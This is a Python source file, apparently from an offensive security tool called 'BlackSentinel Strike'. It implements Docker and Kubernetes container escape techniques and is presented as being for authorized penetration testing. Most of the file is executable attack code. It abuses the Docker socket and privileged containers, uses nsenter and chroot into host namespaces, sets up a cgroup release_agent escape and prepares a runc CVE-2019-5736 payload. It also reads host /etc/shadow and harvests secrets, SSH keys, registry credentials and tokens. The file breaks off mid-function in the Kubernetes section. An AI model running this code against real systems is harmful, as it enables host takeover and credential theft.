#!/usr/bin/env python3
"""
Container Escape Module for BlackSentinel Strike
Copyright (c) 2024-2025 BlackSentinel Strike - All Rights Reserved

Advanced container escape techniques for authorized penetration testing.
Covers Docker, Kubernetes, and generic container breakout scenarios.
"""

import subprocess
import sys
import json
from typing import Dict, Any, List


class ContainerEscape:
    """
    Comprehensive container escape module for authorized penetration testing.
    Provides methods for Docker, Kubernetes, and generic container breakout techniques.
    """

    def __init__(self, verbose: bool = False):
        """Initialize ContainerEscape module."""
        self.verbose = verbose
        self.results: List[Dict[str, Any]] = []
        self.techniques_executed: List[str] = []

    def run_command(self, cmd: str, timeout: int = 30) -> str:
        """
        Execute a shell command and return its output.

        Args:
            cmd: Command string to execute
            timeout: Timeout in seconds for command execution

        Returns:
            Command output string or error message
        """
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                output += "\n[STDERR] " + result.stderr
            if result.returncode != 0:
                output += f"\n[EXIT CODE] {result.returncode}"
            return output.strip()
        except subprocess.TimeoutExpired:
            return f"[ERROR] Command timed out after {timeout} seconds"
        except PermissionError:
            return f"[ERROR] Permission denied executing: {cmd}"
        except Exception as e:
            return f"[ERROR] {str(e)}"

    def _log_result(self, technique: str, output: str, success: bool = True) -> None:
        """Log technique execution result."""
        self.results.append({
            "technique": technique,
            "output": output,
            "success": success
        })
        self.techniques_executed.append(technique)
        if self.verbose:
            status = "[SUCCESS]" if success else "[FAILED]"
            print(f"{status} {technique}")

    def _check_container(self) -> bool:
        """Check if running inside a container."""
        checks = [
            "test -f /.dockerenv && echo 'docker' || echo 'not_docker'",
            "grep -q docker /proc/1/cgroup 2>/dev/null && echo 'cgroup_docker' || echo 'no_cgroup'",
            "test -d /proc/1/ns && echo 'has_ns' || echo 'no_ns'"
        ]
        for check in checks:
            result = self.run_command(check)
            if "docker" in result or "cgroup_docker" in result:
                return True
        return False

    def _get_container_info(self) -> Dict[str, str]:
        """Gather container information."""
        info = {}
        info["hostname"] = self.run_command("hostname")
        info["user"] = self.run_command("whoami")
        info["pid"] = self.run_command("echo $$")
        info["cgroup"] = self.run_command("cat /proc/1/cgroup 2>/dev/null | head -5")
        info["mounts"] = self.run_command("mount | head -20")
        info["env"] = self.run_command("env | head -10")
        info["id"] = self.run_command("id")
        return info

    # =========================================================================
    # DOCKER ESCAPE METHODS (15)
    # =========================================================================

    def docker_socket_mount_escape(self, socket_path: str = "/var/run/docker.sock") -> str:
        """Docker escape via mounted Docker socket."""
        technique = "Docker Socket Mount Escape"
        try:
            output_parts = []
            output_parts.append(f"[*] Target socket: {socket_path}")

            result = self.run_command(f"test -S {socket_path} && echo 'socket_exists' || echo 'socket_missing'")
            if "socket_missing" in result:
                output_parts.append(f"[!] Docker socket not found at {socket_path}")
                self._log_result(technique, "\n".join(output_parts), False)
                return "\n".join(output_parts)

            output_parts.append("[+] Docker socket found")
            output_parts.append("[*] Attempting to create privileged escape container...")

            escape_cmd = (
                f'docker run -d --name blacksentinel_escape '
                f'--privileged -v /:/host '
                f'alpine:latest sleep infinity'
            )
            result = self.run_command(escape_cmd, timeout=60)
            output_parts.append(f"[*] Container creation: {result}")

            result = self.run_command("docker start blacksentinel_escape 2>/dev/null", timeout=30)
            output_parts.append(f"[*] Container start: {result}")

            output_parts.append("[*] Checking host filesystem access...")
            host_check = self.run_command("docker exec blacksentinel_escape ls /host/ 2>/dev/null | head -10")
            output_parts.append(f"[+] Host filesystem:\n{host_check}")

            output_parts.append("[*] Reading /host/etc/shadow...")
            shadow = self.run_command("docker exec blacksentinel_escape cat /host/etc/shadow 2>/dev/null | head -5")
            output_parts.append(f"[+] Shadow file:\n{shadow}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_privileged_escape(self) -> str:
        """Docker escape via privileged container mode."""
        technique = "Docker Privileged Escape"
        try:
            output_parts = []

            result = self.run_command("cat /proc/1/status | grep CapEff")
            output_parts.append(f"[*] Current capabilities: {result}")

            output_parts.append("[*] Attempting privileged container escape...")
            result = self.run_command("ls /dev/sda* 2>/dev/null")
            output_parts.append(f"[*] Available block devices: {result}")

            output_parts.append("[*] Mounting host root via privileged access...")
            mount_result = self.run_command(
                "mkdir -p /tmp/host_root && mount /dev/sda1 /tmp/host_root 2>/dev/null || "
                "mount -t proc none /proc 2>/dev/null && echo 'mount_attempted'",
                timeout=15
            )
            output_parts.append(f"[*] Mount result: {mount_result}")

            output_parts.append("[*] Reading host process information...")
            host_procs = self.run_command("ls /proc/1/root/ 2>/dev/null | head -10")
            output_parts.append(f"[+] Host root listing: {host_procs}")

            output_parts.append("[*] Attempting chroot to host...")
            chroot_result = self.run_command(
                "chroot /proc/1/root /bin/sh -c 'echo chroot_success; id; hostname' 2>/dev/null",
                timeout=15
            )
            output_parts.append(f"[+] Chroot result: {chroot_result}")

            output_parts.append("[*] Checking host credentials...")
            host_shadow = self.run_command("cat /proc/1/root/etc/shadow 2>/dev/null | head -3")
            output_parts.append(f"[+] Host shadow: {host_shadow}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_volume_escape(self) -> str:
        """Docker escape via host volume mounts."""
        technique = "Docker Volume Escape"
        try:
            output_parts = []

            output_parts.append("[*] Scanning for host volume mounts...")
            mounts = self.run_command("mount | grep -E '(/host|/data|/var|/home|/etc)'")
            output_parts.append(f"[*] Potential mounts:\n{mounts}")

            output_parts.append("[*] Checking /proc/mounts for writable host paths...")
            proc_mounts = self.run_command(
                "cat /proc/mounts | grep -v 'proc\\|sys\\|dev\\|cgroup' | head -20"
            )
            output_parts.append(f"[*] Container mounts:\n{proc_mounts}")

            output_parts.append("[*] Attempting to access host filesystem via /proc...")
            proc_root = self.run_command("ls -la /proc/1/root/ 2>/dev/null | head -15")
            output_parts.append(f"[+] /proc/1/root listing:\n{proc_root}")

            output_parts.append("[*] Checking for mounted host paths...")
            for mount_point in ["/host", "/data", "/shared", "/mnt", "/hostfs"]:
                result = self.run_command(f"ls {mount_point}/ 2>/dev/null | head -5")
                if result and "[ERROR]" not in result:
                    output_parts.append(f"[+] Found accessible mount at {mount_point}:\n{result}")

            output_parts.append("[*] Attempting to read host /etc/shadow via /proc...")
            shadow = self.run_command("cat /proc/1/root/etc/shadow 2>/dev/null | head -3")
            output_parts.append(f"[+] Host shadow: {shadow}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_procfs_escape(self) -> str:
        """Docker escape via /proc filesystem manipulation."""
        technique = "Docker Procfs Escape"
        try:
            output_parts = []

            output_parts.append("[*] Accessing /proc filesystem for escape vectors...")
            proc_caps = self.run_command("cat /proc/1/status | grep Cap")
            output_parts.append(f"[*] Process capabilities:\n{proc_caps}")

            output_parts.append("[*] Checking /proc/sys/kernel...")
            kernel_info = self.run_command("ls -la /proc/sys/kernel/ 2>/dev/null | head -10")
            output_parts.append(f"[*] Kernel sys entries:\n{kernel_info}")

            output_parts.append("[*] Reading host namespaces via /proc...")
            ns_info = self.run_command("ls -la /proc/1/ns/ 2>/dev/null")
            output_parts.append(f"[*] Namespace info:\n{ns_info}")

            output_parts.append("[*] Attempting PID namespace breakout...")
            pid_escape = self.run_command(
                "nsenter -t 1 -m -u -i -n -p -- sh -c 'echo nsenter_escape_success; id' 2>/dev/null",
                timeout=15
            )
            output_parts.append(f"[+] nsenter result: {pid_escape}")

            output_parts.append("[*] Checking for ptrace access...")
            ptrace_check = self.run_command(
                "cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null"
            )
            output_parts.append(f"[*] Ptrace scope: {ptrace_check}")

            output_parts.append("[*] Reading host cmdline...")
            host_cmdline = self.run_command("cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '")
            output_parts.append(f"[+] Host init cmdline: {host_cmdline}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_sysfs_escape(self) -> str:
        """Docker escape via /sys filesystem manipulation."""
        technique = "Docker Sysfs Escape"
        try:
            output_parts = []

            output_parts.append("[*] Exploring /sys filesystem escape vectors...")
            sys_entries = self.run_command("ls -la /sys/ 2>/dev/null | head -20")
            output_parts.append(f"[*] /sys directory:\n{sys_entries}")

            output_parts.append("[*] Checking /sys/fs/cgroup...")
            cgroup_info = self.run_command("ls -la /sys/fs/cgroup/ 2>/dev/null | head -15")
            output_parts.append(f"[*] Cgroup entries:\n{cgroup_info}")

            output_parts.append("[*] Reading device capabilities...")
            device_info = self.run_command(
                "cat /sys/fs/cgroup/devices/devices.list 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Device list:\n{device_info}")

            output_parts.append("[*] Checking for writable sysfs entries...")
            writable = self.run_command(
                "find /sys -writable -type f 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Writable sysfs files:\n{writable}")

            output_parts.append("[*] Attempting sysfs-based privilege escalation...")
            sys_escape = self.run_command(
                "echo 'device cgroup breakout attempt' && "
                "cat /sys/fs/cgroup/devices/docker/*/devices.list 2>/dev/null | head -5",
                timeout=15
            )
            output_parts.append(f"[*] Cgroup escape attempt: {sys_escape}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_cgroup_escape(self) -> str:
        """Docker escape via cgroup release_agent."""
        technique = "Docker Cgroup Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking cgroup version and capabilities...")
            cgroup_ver = self.run_command("stat -f /sys/fs/cgroup/ 2>/dev/null | grep Type")
            output_parts.append(f"[*] Cgroup type: {cgroup_ver}")

            output_parts.append("[*] Attempting cgroup release_agent escape...")
            self.run_command("mkdir -p /tmp/cgrp")
            mount_result = self.run_command(
                "mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null && echo 'mounted' || echo 'mount_failed'"
            )
            output_parts.append(f"[*] Cgroup mount: {mount_result}")

            if "mounted" in mount_result:
                self.run_command("mkdir -p /tmp/cgrp/x")
                self.run_command("echo 1 > /tmp/cgrp/x/notify_on_release")
                host_path = self.run_command(
                    "cat /proc/self/cgroup | grep 'pids' | cut -d: -f3"
                )
                output_parts.append(f"[*] Cgroup path: {host_path}")

                escape_cmd = (
                    "echo '/tmp/escape_script.sh' > /tmp/cgrp/release_agent && "
                    "echo '#!/bin/sh' > /tmp/escape_script.sh && "
                    "echo 'id > /tmp/escape_output.txt' >> /tmp/escape_script.sh && "
                    "chmod +x /tmp/escape_script.sh"
                )
                self.run_command(escape_cmd)
                output_parts.append("[*] Release agent configured")

            output_parts.append("[*] Attempting alt escape via cgroup namespace...")
            alt_escape = self.run_command(
                "cat /proc/self/cgroup | head -10",
                timeout=15
            )
            output_parts.append(f"[*] Cgroup info:\n{alt_escape}")

            ns_escape = self.run_command(
                "nsenter --cgroup=/proc/1/ns/cgroup -- cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '",
                timeout=15
            )
            output_parts.append(f"[+] Cgroup nsenter: {ns_escape}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_nsenter_escape(self) -> str:
        """Docker escape via nsenter to host namespaces."""
        technique = "Docker Nsenter Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking for nsenter availability...")
            nsenter_check = self.run_command("which nsenter 2>/dev/null || echo 'nsenter not found'")
            output_parts.append(f"[*] Nsenter: {nsenter_check}")

            output_parts.append("[*] Listing available namespaces...")
            ns_list = self.run_command("ls -la /proc/1/ns/ 2>/dev/null")
            output_parts.append(f"[*] Namespaces:\n{ns_list}")

            output_parts.append("[*] Attempting nsenter to host PID namespace...")
            pid_escape = self.run_command(
                "nsenter -t 1 -p -m -- sh -c 'echo nsenter_pid_success; ps aux | head -10' 2>/dev/null",
                timeout=20
            )
            output_parts.append(f"[+] PID nsenter:\n{pid_escape}")

            output_parts.append("[*] Attempting full namespace nsenter...")
            full_escape = self.run_command(
                "nsenter -t 1 -m -u -i -n -p -- sh -c 'echo full_nsenter_success; id; hostname' 2>/dev/null",
                timeout=20
            )
            output_parts.append(f"[+] Full nsenter:\n{full_escape}")

            output_parts.append("[*] Attempting mount namespace escape...")
            mount_escape = self.run_command(
                "nsenter -t 1 -m -- ls / 2>/dev/null | head -15",
                timeout=15
            )
            output_parts.append(f"[+] Mount namespace root:\n{mount_escape}")

            output_parts.append("[*] Reading host /etc/passwd...")
            host_passwd = self.run_command(
                "nsenter -t 1 -m -- cat /etc/passwd 2>/dev/null | head -5",
                timeout=15
            )
            output_parts.append(f"[+] Host passwd:\n{host_passwd}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_capabilities_escape(self) -> str:
        """Docker escape via Linux capabilities abuse."""
        technique = "Docker Capabilities Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking container capabilities...")
            caps = self.run_command("cat /proc/1/status | grep Cap")
            output_parts.append(f"[*] Capabilities:\n{caps}")

            output_parts.append("[*] Decoding capabilities...")
            cap_hex = self.run_command(
                "grep CapEff /proc/1/status | awk '{print $2}'"
            )
            output_parts.append(f"[*] Effective caps (hex): {cap_hex}")

            output_parts.append("[*] Checking for CAP_SYS_ADMIN...")
            sys_admin = self.run_command(
                "capsh --print 2>/dev/null | grep -i 'current' || echo 'capsh unavailable'"
            )
            output_parts.append(f"[*] Capabilities (capsh): {sys_admin}")

            output_parts.append("[*] Attempting capability-based escape...")
            cap_escape = self.run_command(
                "mount -t tmpfs tmpfs /tmp/host_mount 2>/dev/null && echo 'tmpfs_mounted' || echo 'mount_failed'"
            )
            output_parts.append(f"[*] Tmpfs mount attempt: {cap_escape}")

            output_parts.append("[*] Checking for CAP_NET_RAW for network escape...")
            net_raw = self.run_command(
                "ping -c 1 127.0.0.1 2>/dev/null && echo 'net_raw_available' || echo 'net_raw_unavailable'"
            )
            output_parts.append(f"[*] Net raw check: {net_raw}")

            output_parts.append("[*] Checking for CAP_MKNOD for device creation...")
            mknod_check = self.run_command(
                "mknod /tmp/testdevice c 1 3 2>/dev/null && echo 'mknod_success' || echo 'mknod_failed'"
            )
            output_parts.append(f"[*] Mknod check: {mknod_check}")

            output_parts.append("[*] Checking for CAP_SETUID/CAP_SETGID...")
            suid_check = self.run_command(
                "su -c 'echo suid_test' root 2>/dev/null || echo 'su_failed'"
            )
            output_parts.append(f"[*] SUID check: {suid_check}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_dev_escape(self) -> str:
        """Docker escape via /dev filesystem device access."""
        technique = "Docker Dev Filesystem Escape"
        try:
            output_parts = []

            output_parts.append("[*] Scanning /dev for accessible host devices...")
            dev_list = self.run_command("ls -la /dev/ 2>/dev/null | head -30")
            output_parts.append(f"[*] /dev contents:\n{dev_list}")

            output_parts.append("[*] Checking for block devices...")
            block_devs = self.run_command("ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null")
            output_parts.append(f"[*] Block devices: {block_devs}")

            output_parts.append("[*] Checking /dev/mem access...")
            mem_check = self.run_command(
                "test -r /dev/mem && echo 'mem_readable' || echo 'mem_not_readable'"
            )
            output_parts.append(f"[*] /dev/mem: {mem_check}")

            output_parts.append("[*] Checking /dev/sda access...")
            sda_check = self.run_command(
                "test -r /dev/sda && echo 'sda_readable' || echo 'sda_not_readable'"
            )
            output_parts.append(f"[*] /dev/sda: {sda_check}")

            if "sda_readable" in sda_check:
                output_parts.append("[+] /dev/sda is readable - attempting escape...")
                sda_read = self.run_command(
                    "dd if=/dev/sda bs=512 count=1 2>/dev/null | xxd | head -10"
                )
                output_parts.append(f"[+] SDA first sector:\n{sda_read}")

            output_parts.append("[*] Checking /dev/mapper for LVM...")
            mapper = self.run_command("ls -la /dev/mapper/ 2>/dev/null")
            output_parts.append(f"[*] LVM devices: {mapper}")

            output_parts.append("[*] Checking TTY devices for host access...")
            tty_check = self.run_command(
                "ls -la /dev/tty* 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] TTY devices: {tty_check}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_mount_host_escape(self) -> str:
        """Docker escape by mounting host filesystem."""
        technique = "Docker Mount Host Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking available mount capabilities...")
            mount_check = self.run_command("mount 2>/dev/null | head -20")
            output_parts.append(f"[*] Current mounts:\n{mount_check}")

            output_parts.append("[*] Attempting to mount host root filesystem...")
            mount_result = self.run_command(
                "mkdir -p /tmp/host && mount /dev/sda1 /tmp/host 2>/dev/null && echo 'mount_sda1' || "
                "mount /dev/vda1 /tmp/host 2>/dev/null && echo 'mount_vda1' || "
                "mount /dev/xvda1 /tmp/host 2>/dev/null && echo 'mount_xvda1' || "
                "mount -t ext4 /dev/sda1 /tmp/host 2>/dev/null && echo 'mount_ext4' || "
                "echo 'direct_mount_failed'",
                timeout=30
            )
            output_parts.append(f"[*] Mount result: {mount_result}")

            output_parts.append("[*] Attempting proc filesystem mount for host access...")
            proc_mount = self.run_command(
                "mount -t proc proc /tmp/host_proc 2>/dev/null && echo 'proc_mounted' || echo 'proc_failed'"
            )
            output_parts.append(f"[*] Proc mount: {proc_mount}")

            output_parts.append("[*] Checking for loop devices...")
            loop_check = self.run_command(
                "losetup -a 2>/dev/null || echo 'losetup unavailable'"
            )
            output_parts.append(f"[*] Loop devices: {loop_check}")

            output_parts.append("[*] Attempting disk partition discovery...")
            part_info = self.run_command(
                "fdisk -l 2>/dev/null | head -20 || parted -l 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Disk info:\n{part_info}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_runc_escape(self) -> str:
        """Docker escape via runc vulnerability (CVE-2019-5736)."""
        technique = "Docker Runc Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking runc version...")
            runc_version = self.run_command("runc --version 2>/dev/null || echo 'runc not directly accessible'")
            output_parts.append(f"[*] Runc version: {runc_version}")

            output_parts.append("[*] Checking containerd version...")
            containerd_ver = self.run_command(
                "containerd --version 2>/dev/null || ctr version 2>/dev/null || echo 'containerd not accessible'"
            )
            output_parts.append(f"[*] Containerd: {containerd_ver}")

            output_parts.append("[*] Checking for runc binary...")
            runc_path = self.run_command("which runc 2>/dev/null || find / -name 'runc' -type f 2>/dev/null | head -5")
            output_parts.append(f"[*] Runc path: {runc_path}")

            output_parts.append("[*] Checking /proc/self/exe for current process...")
            proc_exe = self.run_command(
                "ls -la /proc/self/exe 2>/dev/null"
            )
            output_parts.append(f"[*] Process exe: {proc_exe}")

            output_parts.append("[*] Attempting runc exploit preparation...")
            exploit_prep = self.run_command(
                "mkdir -p /tmp/exploit && echo '#!/bin/bash' > /tmp/exploit/payload.sh && "
                "echo 'cat /etc/shadow > /proc/self/root/etc/shadow' >> /tmp/exploit/payload.sh",
                timeout=10
            )
            output_parts.append(f"[*] Exploit prep: {exploit_prep}")

            output_parts.append("[*] Checking for vulnerable runc versions...")
            vuln_check = self.run_command(
                "runc --version 2>/dev/null | grep -E 'version.*1\\.(0-[0-2]|[0-0]\\.)' || echo 'version_check_complete'"
            )
            output_parts.append(f"[*] Vulnerability check: {vuln_check}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_containerd_escape(self) -> str:
        """Docker escape via containerd socket."""
        technique = "Docker Containerd Escape"
        try:
            output_parts = []

            output_parts.append("[*] Locating containerd socket...")
            socket_paths = [
                "/run/containerd/containerd.sock",
                "/var/run/containerd/containerd.sock",
                "/run/containerd.sock"
            ]
            found_socket = None
            for path in socket_paths:
                check = self.run_command(f"test -S {path} && echo 'found' || echo 'not_found'")
                if "found" in check:
                    found_socket = path
                    output_parts.append(f"[+] Found containerd socket at: {path}")
                    break

            if not found_socket:
                output_parts.append("[!] No containerd socket found")

            output_parts.append("[*] Checking containerd socket permissions...")
            socket_perms = self.run_command(
                "ls -la /run/containerd/containerd.sock 2>/dev/null"
            )
            output_parts.append(f"[*] Socket permissions: {socket_perms}")

            output_parts.append("[*] Attempting ctr connection...")
            ctr_check = self.run_command(
                "ctr -a /run/containerd/containerd.sock version 2>/dev/null || echo 'ctr_failed'"
            )
            output_parts.append(f"[*] Ctr version: {ctr_check}")

            output_parts.append("[*] Listing containerd containers...")
            containers = self.run_command(
                "ctr -a /run/containerd/containerd.sock containers ls 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Containers: {containers}")

            output_parts.append("[*] Checking nerdctl availability...")
            nerdctl = self.run_command(
                "nerdctl --version 2>/dev/null || echo 'nerdctl not available'"
            )
            output_parts.append(f"[*] Nerdctl: {nerdctl}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_overlay_escape(self) -> str:
        """Docker escape via overlay filesystem manipulation."""
        technique = "Docker Overlay Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking overlay filesystem...")
            overlay_check = self.run_command(
                "mount | grep overlay"
            )
            output_parts.append(f"[*] Overlay mounts:\n{overlay_check}")

            output_parts.append("[*] Inspecting overlay layers...")
            overlay_dirs = self.run_command(
                "cat /proc/mounts | grep overlay"
            )
            output_parts.append(f"[*] Overlay configuration:\n{overlay_dirs}")

            output_parts.append("[*] Checking overlay upperdir...")
            upperdir = self.run_command(
                "cat /proc/mounts | grep overlay | grep -oP 'upperdir=\\K[^,]+' 2>/dev/null"
            )
            output_parts.append(f"[*] Upper directory: {upperdir}")

            output_parts.append("[*] Checking overlay workdir...")
            workdir = self.run_command(
                "cat /proc/mounts | grep overlay | grep -oP 'workdir=\\K[^,]+' 2>/dev/null"
            )
            output_parts.append(f"[*] Work directory: {workdir}")

            output_parts.append("[*] Attempting to access host via overlay...")
            if upperdir and upperdir != "":
                host_access = self.run_command(
                    f"ls -la {upperdir}/../ 2>/dev/null | head -10"
                )
                output_parts.append(f"[+] Overlay parent access:\n{host_access}")

            output_parts.append("[*] Checking for overlay escape via lowerdir...")
            lowerdir = self.run_command(
                "cat /proc/mounts | grep overlay | grep -oP 'lowerdir=\\K[^,]+' 2>/dev/null"
            )
            output_parts.append(f"[*] Lower directory: {lowerdir}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_pid_namespace_escape(self) -> str:
        """Docker escape via host PID namespace."""
        technique = "Docker PID Namespace Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking PID namespace isolation...")
            pid_check = self.run_command(
                "ls -la /proc/ 2>/dev/null | grep -E '^[0-9]+$' | wc -l"
            )
            output_parts.append(f"[*] Visible PIDs: {pid_check}")

            output_parts.append("[*] Checking for host PID namespace sharing...")
            ns_pid = self.run_command(
                "ls -la /proc/1/ns/pid 2>/dev/null"
            )
            output_parts.append(f"[*] PID namespace: {ns_pid}")

            output_parts.append("[*] Reading init process info...")
            init_info = self.run_command(
                "cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '"
            )
            output_parts.append(f"[*] Init process: {init_info}")

            output_parts.append("[*] Attempting host PID access...")
            host_pids = self.run_command(
                "ls /proc/ | grep -E '^[0-9]+$' | sort -n | tail -20"
            )
            output_parts.append(f"[*] Available PIDs:\n{host_pids}")

            output_parts.append("[*] Checking for host processes visible...")
            ps_check = self.run_command(
                "ps aux 2>/dev/null | head -20 || ps -ef 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Process list:\n{ps_check}")

            output_parts.append("[*] Attempting to read host process namespaces...")
            host_ns = self.run_command(
                "readlink /proc/1/ns/mnt 2>/dev/null"
            )
            output_parts.append(f"[*] Init mount namespace: {host_ns}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def docker_env_escape(self) -> str:
        """Docker escape via environment variable and secret exposure."""
        technique = "Docker Environment Escape"
        try:
            output_parts = []

            output_parts.append("[*] Harvesting environment variables...")
            env_vars = self.run_command("env 2>/dev/null")
            output_parts.append(f"[*] Environment variables:\n{env_vars}")

            output_parts.append("[*] Checking for Docker secrets...")
            docker_secrets = self.run_command(
                "ls -la /run/secrets/ 2>/dev/null || ls -la /var/run/secrets/ 2>/dev/null"
            )
            output_parts.append(f"[*] Docker secrets:\n{docker_secrets}")

            output_parts.append("[*] Reading Docker config files...")
            docker_config = self.run_command(
                "cat /etc/docker/daemon.json 2>/dev/null || echo 'no_docker_config'"
            )
            output_parts.append(f"[*] Docker config:\n{docker_config}")

            output_parts.append("[*] Checking for registry credentials...")
            registry_creds = self.run_command(
                "cat /root/.docker/config.json 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Registry creds:\n{registry_creds}")

            output_parts.append("[*] Checking for SSH keys...")
            ssh_keys = self.run_command(
                "ls -la /root/.ssh/ 2>/dev/null || ls -la /home/*/.ssh/ 2>/dev/null"
            )
            output_parts.append(f"[*] SSH keys: {ssh_keys}")

            output_parts.append("[*] Checking for API tokens...")
            api_tokens = self.run_command(
                "env | grep -iE '(token|key|secret|password|api)' 2>/dev/null"
            )
            output_parts.append(f"[*] API tokens:\n{api_tokens}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    # =========================================================================
    # KUBERNETES ESCAPE METHODS (15)
    # =========================================================================

    def k8s_hostpath_escape(self) -> str:
        """Kubernetes escape via hostPath volume mount."""
        technique = "K8s HostPath Escape"
        try:
            output_parts = []

            output_parts.append("[*] Scanning for hostPath volumes...")
            mount_info = self.run_command("mount 2>/dev/null | grep -v 'proc\\|sys\\|dev\\|cgroup'")
            output_parts.append(f"[*] Current mounts:\n{mount_info}")

            output_parts.append("[*] Checking /host access...")
            host_check = self.run_command(
                "ls -la /host/ 2>/dev/null | head -15 || echo 'no /host mount'"
            )
            output_parts.append(f"[*] Host access:\n{host_check}")

            output_parts.append("[*] Checking common hostPath mount points...")
            host_paths = ["/host", "/host-root", "/hostfs", "/mnt/host", "/data"]
            for path in host_paths:
                check = self.run_command(f"ls -la {path}/ 2>/dev/null | head -5")
                if check and "[ERROR]" not in check and "no " not in check:
                    output_parts.append(f"[+] Found accessible hostPath: {path}\n{check}")

            output_parts.append("[*] Attempting host filesystem access via /proc...")
            proc_root = self.run_command("ls -la /proc/1/root/ 2>/dev/null | head -15")
            output_parts.append(f"[+] /proc/1/root:\n{proc_root}")

            output_parts.append("[*] Reading host /etc/shadow via hostPath...")
            shadow = self.run_command(
                "cat /host/etc/shadow 2>/dev/null | head -5 || "
                "cat /proc/1/root/etc/shadow 2>/dev/null | head -5"
            )
            output_parts.append(f"[+] Shadow:\n{shadow}")

            output_parts.append("[*] Listing host /etc/kubernetes...")
            k8s_config = self.run_command(
                "ls -la /host/etc/kubernetes/ 2>/dev/null | head -15"
            )
            output_parts.append(f"[+] K8s config:\n{k8s_config}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_privileged_escape(self) -> str:
        """Kubernetes escape via privileged pod."""
        technique = "K8s Privileged Pod Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking for privileged container indicators...")
            caps = self.run_command("cat /proc/1/status | grep CapEff")
            output_parts.append(f"[*] Capabilities: {caps}")

            output_parts.append("[*] Checking device access...")
            devices = self.run_command("ls -la /dev/ 2>/dev/null | grep -E 'sd|vd|nvme'")
            output_parts.append(f"[*] Block devices: {devices}")

            output_parts.append("[*] Checking /proc/sysrq-trigger access...")
            sysrq = self.run_command(
                "test -w /proc/sysrq-trigger && echo 'sysrq_writable' || echo 'sysrq_not_writable'"
            )
            output_parts.append(f"[*] Sysrq access: {sysrq}")

            output_parts.append("[*] Attempting to mount host filesystem...")
            mount_result = self.run_command(
                "mkdir -p /tmp/host_escape && "
                "mount /dev/sda1 /tmp/host_escape 2>/dev/null && echo 'mounted' || "
                "mount /dev/vda1 /tmp/host_escape 2>/dev/null && echo 'mounted' || "
                "mount -t ext4 /dev/sda1 /tmp/host_escape 2>/dev/null && echo 'mounted' || "
                "echo 'mount_failed'"
            )
            output_parts.append(f"[*] Mount result: {mount_result}")

            output_parts.append("[*] Checking for node access...")
            node_access = self.run_command(
                "cat /etc/hostname 2>/dev/null"
            )
            output_parts.append(f"[*] Node hostname: {node_access}")

